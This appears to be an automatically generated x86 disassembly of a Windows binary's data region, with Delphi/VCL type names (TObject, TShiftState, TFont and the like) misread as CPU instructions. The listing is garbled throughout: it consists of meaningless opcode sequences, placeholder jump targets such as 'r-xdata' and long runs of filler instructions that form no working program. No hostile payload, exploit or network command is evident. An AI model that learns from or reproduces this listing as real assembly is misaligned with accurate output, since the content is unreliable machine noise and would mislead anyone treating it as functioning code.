add ah cl
js r-xdata
inc eax
add [ ebp + edx * 2 + 0x43 ] bl
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
mov eax [ 0xffffffff935c0041 ]
inc ebx
add [ eax - 0x60 ] ch
inc ecx
add ah bh
mov al [ 0xffffffffa1500041 ]
inc ecx
add [ eax + 0x18004392 ] dh
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
call sub_4395d7
add al dl
js r-xdata
pop [ ebx ]
adc al 0x44
add [ eax ] edx
push ebp
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x54 ] ch
inc ebx
add [ ebx ] cl
jae r-xdata
in al dx
push esp
inc ebx
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ch
push ebx
inc ebx
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
mov al [ 0xffffffff92b00041 ]
inc ebx
add [ eax ] bl
mov al 0xa0
inc ecx
add [ eax - 0x1bffbc70 ] dl
jae r-xdata
inc ebx
add [ eax ] al
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
push esp
inc ebx
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
shr [ esp + edx * 2 + 0x43 ] 0x0
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
inc ecx
add [ esp + eax * 2 ] dl
xor [ eax ] al
and [ esi + 0x440c0043 ] cl
push edx
inc ebx
add [ esi + esi * 4 + 0x40041 ] cl
or [ ebx + 0x6f ] al
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
inc ebx
outsd
outsb
jae r-xdata
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ eax + edx * 4 + 0x43 ] bh
add [ esp + eax * 2 ] dl
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah bh
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
inc ecx
add [ ecx + edx * 4 + 0x68840043 ] bl
inc esp
add [ eax ] dl
xchg edx eax
inc ebx
add [ eax + ebp * 2 + 0x68c00044 ] ch
inc esp
add [ eax + 0x44004393 ] cl
xchg edx eax
inc ebx
add ah bh
push 0x69100044
inc esp
add [ edx + edx * 4 + 0x43 ] bh
add [ eax ] bh
imul eax [ eax + eax - 0x28 ] 0x40004392
imul eax [ eax + eax - 0x8 ] 0x48004392
imul eax [ eax + eax + 0xc ] 0xec004394
xchg ebx eax
inc ebx
add [ esp + edx * 4 ] ch
inc ebx
add [ eax ] bl
xchg ebx eax
inc ebx
add [ ecx + ebp * 2 + 0x44 ] bl
add [ eax + 0x69 ] ah
inc esp
add [ ebx + edx * 4 ] bh
inc ebx
add [ eax + edx * 4 + 0x54120043 ] ch
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x43556c74
jb r-xdata
popad
js r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc edx
inc ecx
add [ eax + 0x1400438f ] ch
inc esp
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xfc004030
outsd
insb
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
outsb
je r-xdata
or [ ebx + 0x6f ] al
push esp
inc ebx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebp + 0x535c0040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
push ebx
inc ebx
add [ eax + eax ] bl
add [ eax ] al
pushfd
popad
inc esp
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x435738c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
push ebp
inc ebx
add [ eax ] dl
add [ eax ] al
push eax
pop [ ebx ]
add [ eax ] eax
add [ eax ] al
add al [ eax ]
imul ebp [ esi + 0x74 ] 0x4355d873
add ah bl
sbb al [ ecx ]
add al 0x0
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
add al 0x56
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x5514c08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
mov eax 0x3004354
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
push ebx
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
add [ eax + eax ] dl
add bh bh
inc ebx
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
add [ edi + ecx * 4 + 0x43 ] ch
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
inc ebx
add eax 0x0
inc ebx
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x1
inc ebx
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
adc al 0x55
or [ ebx + 0x6f ] al
outsb
je r-xdata
add ah dh
adc [ eax ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
push eax
pop [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x61 ] ecx
js r-xdata
add [ ebp + edx * 2 + 0x43 ] ch
dec esp
popad
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] al
add [ eax ] dl
push ebp
inc ebx
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add ah dh
adc [ eax ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
push 0x50004010
adc eax [ ecx ]
nop
call 0x8439b40
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x43556c74
imul esp [ gs : edi + 0x68 ] 0x43556c74
add [ eax + eax ] cl
add bh bh
add [ ecx ] al
add [ eax ] al
add [ esp + edx * 2 ] ch
inc ebx
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add [ eax + 0x3004354 ] bh
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
hlt
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jbe r-xdata
push cs
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x54 ] ch
inc ebx
add [ eax ] al
adc [ eax ] al
nop
lodsb [ esi ]
pop eax
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
outsb
je r-xdata
hlt
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
hlt
add [ eax ] cl
dec edi
inc ebx
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
inc esp
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
jb r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
je r-xdata
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add ah dh
adc [ eax ] al
sub [ eax ] dl
inc eax
add [ ebp + 0x58240040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xf4007261
adc [ eax ] al
pop es
inc edx
outsd
outsd
insb
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x590c0040 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
jbe r-xdata
hlt
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
pop es
dec ecx
outsb
je r-xdata
inc esp
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x8004359 ] dh
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ ecx + ebx * 2 + 0x43 ] dl
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
or [ edi + 0x43 ] cl
push ebx
outsb
add al 0x8
push es
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
hlt
hlt
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
inc esp
outsd
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
jbe r-xdata
inc ebp
jbe r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
outsb
je r-xdata
inc ebx
jpe r-xdata
add [ ecx + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
in al dx
pop ebx
inc ebx
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
test al 0x51
inc ebx
add [ eax + 0x5b ] ah
inc ebx
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x435d74c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add ah dh
adc [ eax ] al
add [ ecx + 0x43 ] ah
add [ eax + 0x4367 ] ch
adc [ eax ] al
adc al 0x5b
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
test al 0x51
inc ebx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x54 ] ch
inc ebx
add [ eax ] al
adc [ eax ] al
nop
test al 0x5a
inc ebx
add [ eax ] cl
or al 0x54
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax + edx ] bh
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x435cecc0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
pop edi
inc ebx
js r-xdata
insb
outsd
ja r-xdata
insb
popad
outsb
add ah dh
adc [ eax ] al
push eax
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add al ch
pop ebp
inc ebx
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
inc ebx
add eax 0x65530608
outsb
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
je r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
hlt
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ edi + esi * 4 + 0x43 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax ] al
cmp [ esi ] ah
inc ecx
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
jo r-xdata
add [ eax ] bh
inc ecx
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x5e8c0040 ] cl
inc ebx
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
push eax
adc eax [ ecx ]
cmp al 0x10
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
pop esp
pop esp
inc ebx
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
pop edi
inc ebx
add [ ecx ] al
inc ebx
add [ eax ] al
lea eax [ eax ]
mov [ esi + 0x43 ] ds
jbe r-xdata
add dh dh
pushad
inc ebx
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ edx * 4 - 0x3bcbffbd ] ah
inc ebx
add [ eax + edi * 4 ] ch
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add ah bh
retn
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_4363bf
rol ah 0x63
inc ebx
add [ edi ] cl
or al 0x49
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ eax + ecx * 8 + 0x43 ] dl
add [ ecx + edx + 0x44 ] dl
add [ eax + 0x16 ] dh
inc esp
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax - 0x10 ]
or eax [ eax + eax + 0x8 ]
or [ eax + eax - 0x28 ] eax
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0xffffffffe53c0043 ] eax
inc ebx
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add [ ebx + ecx * 8 - 0x2dd7ffbd ] dl
inc ebx
add al cl
fild [ ebx ]
mov ah 0xd9
inc ebx
add [ eax - 0x1fffbc24 ] dh
fiadd [ ebx ]
pushad
loopne r-xdata
outsd
insb
jae r-xdata
adc eax 0x15011400
add [ eax + 0x43 ] ah
add [ edi + ebx * 8 ] bl
inc ebx
add ah al
fiadd [ ebx ]
cmp al 0xb
inc esp
add [ ecx + ebp * 8 ] cl
inc ebx
add [ esp + ebx + 0x44 ] bh
add [ eax - 0x57ffbbf9 ] bh
or al [ eax + eax + 0xe ]
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al al
arpl [ ebx ] ax
jl r-xdata
add [ eax ] al
add [ eax ] al
or [ ebp + 0x43 ] ah
add [ edi + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ah [ ebp + 0x43 ]
add [ edx + 0x4004367 ] bl
add al [ eax ]
add [ eax + 0x5e ] al
inc ebx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax - 0x63ffbc1a ] ah
xor [ eax ] al
mov eax 0x78004030
leave
inc ebx
add [ eax + 0x16 ] al
inc esp
add [ eax - 0x22 ] ch
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add ah bh
retn
add bh bh
inc [ eax + 0x64 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc ebx
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax ] dh
arpl [ ebx ] ax
mov [ ecx ] al
add [ eax ] al
imul eax [ eax ] 0x111000f
dec esi
add [ 0x15011400 ] dl
add [ eax ] al
xor [ ebx + 0x43 ] ah
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
sub_4366cf
inc [ ebx ]
fdiv st6
inc ebx
add [ eax - 0x1 ] dl
inc ebx
add [ edi + edi * 8 + 0x43 ] bl
add al al
add [ eax + eax + 0x50 ] eax
add al [ eax + eax - 0x38 ]
add [ eax + eax - 0x30 ] eax
add [ eax + eax - 0x28 ] eax
add [ eax + eax - 0x20 ] eax
add [ eax + eax ] eax
add eax [ eax + eax - 0x1c ]
